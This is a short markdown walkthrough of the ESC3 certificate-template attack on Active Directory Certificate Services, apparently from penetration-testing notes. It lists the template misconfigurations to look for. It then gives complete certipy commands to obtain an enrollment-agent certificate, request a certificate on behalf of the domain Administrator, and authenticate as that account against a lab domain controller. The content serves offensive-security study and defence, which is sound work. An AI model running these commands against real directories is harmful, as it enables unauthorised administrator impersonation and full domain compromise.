# ESC3: Enrollment Agent Certificate Template


Prerequistes:
- For the agent-issuing template (e.g., `EnrollAgent`):
        - `[!] Vulnerabilities ESC3 : Template has Certificate Request Agent EKU set.`
        - `Enrollment Agent : True`
        - `Extended Key Usage` contains `Certificate Request Agent`.
        - `[+] User Enrollable Principals` lists a group the attacker belongs to (e.g., `CORP.LOCAL\Domain Users`), granting them rights to obtain an agent certificate.
- For the target template (e.g., `User`):
        - `[*] Remarks ESC3 Target Template : ... Template has schema version 1.` Schema Version 1 templates are common targets because they typically allow agent-based enrollment without additional restrictions on the agent's certificate.
        - `Client Authentication : True` (or similar authentication EKU).
        - `[+] User Enrollable Principals` for the target template should ideally show that the _target victim_ (e.g., Administrator or Domain Admins group) has enrollment rights.

---
**Step 1: Obtain an Enrollment Agent certificate:**
The attacker (`attacker@lol.local`) enrolls for a certificate from the misconfigured `ESC3` template (or an ESC2 "Any Purpose" template).

```bash
certipy req \
    -u 'attacker@lol.local' -p 'attacker' \
    -dc-ip '10.10.111.10' -target 'DC01.LOL.LOCAL' \
    -ca 'LOL-CA' -template 'ESC3_CRA'
```
This command requests a certificate for `attacker@lol.local` using the `EnrollAgent` template. The output `.pfx` file (`attacker.pfx` in this case) will contain the Enrollment Agent certificate.

**Step 2: Use the Enrollment Agent certificate to request a certificate on behalf of the target user:** 
The attacker uses their `attacker.pfx` (their agent certificate obtained in Step 1) to request a certificate from the `User` template (or another suitable agent-enrollable target template) on behalf of `LOL\Administrator`.

```bash
certipy req \
    -u 'attacker@lol.local' -p 'attacker' \
    -dc-ip '10.10.111.10' -target 'DC01.LOL.LOCAL' \
    -ca 'LOL-CA' -template 'User' \
    -pfx 'attacker.pfx' -on-behalf-of 'LOL\Administrator'



# -template 'User': The target template that allows agent enrollment and issues authentication certificates.

# -pfx 'attacker.pfx': Specifies the attacker's own certificate, which will be used as the enrollment agent certificate to sign the "on-behalf-of" request.

# -on-behalf-of 'LOL\Administrator': Specifies the target user for whom the new certificate is being requested. This parameter requires the <DOMAIN_NETBIOS_NAME>\<SAM_ACCOUNT_NAME> format for the user.

```

This creates `administrator.pfx`, a certificate valid for the `Administrator` account, but now possessed by the attacker.

**Step 3: Authenticate using the "on-behalf-of" certificate:**
The attacker uses the `administrator.pfx` (obtained in Step 2) to authenticate as the Administrator.

```shell
certipy auth -pfx 'administrator.pfx' -dc-ip '10.10.111.10'
```
